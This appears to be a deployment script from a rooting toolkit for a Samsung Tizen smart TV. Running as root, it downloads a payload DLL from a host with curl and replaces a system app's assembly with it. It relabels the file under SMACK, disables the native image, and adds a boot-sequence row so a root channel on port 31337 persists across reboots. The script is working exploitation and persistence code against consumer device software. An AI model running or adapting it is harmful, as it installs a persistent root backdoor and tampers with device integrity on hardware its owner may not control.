#!/bin/sh
# Install the root-on-boot payload into the MultiControl-Service app.
# Runs on the TV as root (the deploy child inherits the patched stub cred).
# The caller rewrites the H= line with the real host IP before serving this.
H="http://HOST_IP"
HIP=${H#http://}
S=/opt/usr/home/owner/share
D=/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll
B="$S/payload_backup.dll"
A="$S/rootchan.allow"
HOSTF="$S/rootchan.host"
DB=/opt/dbspace/user/5001/.appsvc.db
WANT=5b798012ae35c9c567fa7a5ea91d6683
SIZE_WANT=23040
APPID=com.samsung.tv.MultiControl-Service
# SMACK label the app runs under.  Files in bin/ carry "<label>::RO" and the app
# (label "<label>") may read those.  A file created by US keeps OUR label - e.g.
# User::Pkg::org.tizen.browser when the deploy runs from the browser stub - and
# the app is then denied read on its own assembly and dies before Main.  That was
# the entire 2026-10-22 boot-persistence regression, so set it explicitly.
WANT_LABEL="User::Pkg::$APPID::RO"
# md5 of the stock IL / AOT image (same values uninstall.sh trusts).  A backup
# is only taken when the file we are about to replace still matches, so we can
# never label a payload or a corrupt copy as "stock".
IL_STOCK=f61f60dd2f581f60bcb716c336cd78f2
NI_STOCK=6c9bdcc40d685e4adc3e2c9ea64870d1

echo DEPLOY_START
U=$(id -u)
echo "UID=$U"
if [ "$U" != "0" ]; then
  echo NOT_ROOT
  exit 1
fi

curl -fsS -o /tmp/mcs_payload.dll "$H/payload.dll" || { echo CURL_FAIL; exit 1; }
SIZE=$(wc -c < /tmp/mcs_payload.dll)
echo "SIZE=$SIZE"
md5sum /tmp/mcs_payload.dll

# verify before touching the app: exact size and md5
if [ "$SIZE" != "$SIZE_WANT" ] || ! md5sum /tmp/mcs_payload.dll | grep -q "^$WANT"; then
  echo COPY=skip
  exit 1
fi

BIN=$(dirname "$D")

# --- stock backups, BEFORE anything is replaced -------------------------------
# uninstall.sh refuses to run without these and nothing used to create them: a
# first-time user could root and never cleanly uninstall.  They are only made
# when the file being replaced is the known stock build, and the md5 of what we
# snapshotted is recorded so uninstall can verify a non-retail TV too.
IL_MD5=$(md5sum "$D" 2>/dev/null | cut -d' ' -f1)
if [ -f "$S/mcs_orig.dll" ]; then
  echo BACKUP_IL=exists
elif [ "$IL_MD5" = "$IL_STOCK" ]; then
  cp "$D" "$S/mcs_orig.dll" && echo "$IL_MD5" > "$S/mcs_orig.md5" \
    && echo BACKUP_IL=ok || echo BACKUP_IL=fail
else
  # Already running our payload (or an unknown build): copying it would only
  # make uninstall restore the wrong thing, so say so instead.
  echo "BACKUP_IL=skip (current IL md5 $IL_MD5 is not the stock build)"
fi
if [ -f "$S/mcs_ni_orig.dll" ]; then
  echo BACKUP_NI=exists
elif [ -d "$BIN/.native_image" ]; then
  NI=$(ls "$BIN"/.native_image/*.ni.dll 2>/dev/null | head -n1)
  NI_MD5=$([ -n "$NI" ] && md5sum "$NI" | cut -d' ' -f1)
  if [ -n "$NI" ] && [ "$NI_MD5" = "$NI_STOCK" ]; then
    cp "$NI" "$S/mcs_ni_orig.dll" && echo "$NI_MD5" > "$S/mcs_ni_orig.md5" \
      && echo BACKUP_NI=ok || echo BACKUP_NI=fail
  else
    echo "BACKUP_NI=skip (AOT md5 ${NI_MD5:-none} is not the stock build)"
  fi
else
  echo BACKUP_NI=none
fi

# v7+ allowlist: only this host may use port 31337.  Written BEFORE the DLL so an
# interrupted deploy can never leave an open (unauthenticated) root channel.
echo "$HIP" > "$A" || { echo ALLOW_FAIL; exit 1; }
echo "ALLOW=$HIP"
# Record the PC address on the TV: recover.sh reads it, and the payload can use it
# instead of a compiled-in default.
echo "$HIP" > "$HOSTF"
echo "HOST_FILE=$HIP"

# atomic within the same directory: no half-written DLL if the app dies.
# The label is set and VERIFIED on the temp file, before it can replace the live
# one: a mismatch that aborted after the rename would leave the app unable to
# start (the 2026-10-22 regression).  A failed copy MUST abort too - previously
# the script printed COPY=ok even when every cp was denied.
cp /tmp/mcs_payload.dll "$B.tmp" && mv "$B.tmp" "$B" || echo BACKUP_COPY=fail
cp /tmp/mcs_payload.dll "$D.tmp" || {
  echo COPY=fail
  echo "HINT: the app bin/ is not writable from this label - deploy from the"
  echo "app's own channel (31337) or fix the SMACK label first"
  exit 1
}
# chsmack needs the file's *current* label to match the caller's for an
# unprivileged relabel, which is exactly the case here (we just created it).
chsmack -a "$WANT_LABEL" "$D.tmp" 2>/dev/null
GOT_LABEL=$(ls -lZ "$D.tmp" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^User::|^System::|^_$/) {print $i; exit}}')
echo "DLL_LABEL=$GOT_LABEL"
if [ "$GOT_LABEL" != "$WANT_LABEL" ]; then
  echo DLL_LABEL_MISMATCH
  rm -f "$D.tmp"
  exit 1
fi
mv "$D.tmp" "$D" || { echo COPY=fail; exit 1; }
echo COPY=ok
md5sum "$D" | grep -q "^$WANT" || { echo MD5_FAIL; exit 1; }

# the runtime prefers the AOT image; disable it so the IL (payload) runs
if [ -d "$BIN/.native_image" ]; then
  mv "$BIN/.native_image" "$BIN/.native_image.disabled.$(date +%s)" && echo AOT=disabled
fi

# make sure AUL starts the app again (uninstall removes this row)
sqlite3 "$DB" "insert or replace into boot_sequence(package,appid,after,before,requires,conflicts,vconf,path_exists,args,background_launch,wait_until_ready,timeout) values('com.samsung.tv.MultiControl-Service','com.samsung.tv.MultiControl-Service','','','','','','','','false','true','10');" && echo BOOT_ROW=ok
# read it back: the row is what makes this survive a reboot, so verify, don't assume
ROWS=$(sqlite3 "$DB" "select count(*) from boot_sequence where appid='com.samsung.tv.MultiControl-Service';" 2>/dev/null)
echo "BOOT_ROW_COUNT=${ROWS:-unknown}"
if [ "$ROWS" != "1" ]; then
  echo BOOT_ROW_WARN
  exit 1
fi
# AUL caches the boot sequence; reload so the row is picked up at boot
if ! aulctl reload 5001; then
  echo AUL_RELOAD=fail
  exit 1
fi
echo AUL_RELOAD=ok
# `reload` only refreshes AUL's copy of the sequence - it does NOT restart an
# app that is already running, so a *changed* DLL would stay unloaded. An
# explicit stop+start makes it take effect now, but `aulctl stop` BLOCKS while
# the payload is running (measured: it hangs waiting for the app to exit), so it
# runs detached and the deploy script returns immediately.
( sleep 1; aulctl stop "$APPID" >/dev/null 2>&1; sleep 3; aulctl start "$APPID" >/dev/null 2>&1 ) >/dev/null 2>&1 &
echo RESTART=backgrounded
echo DEPLOY_DONE
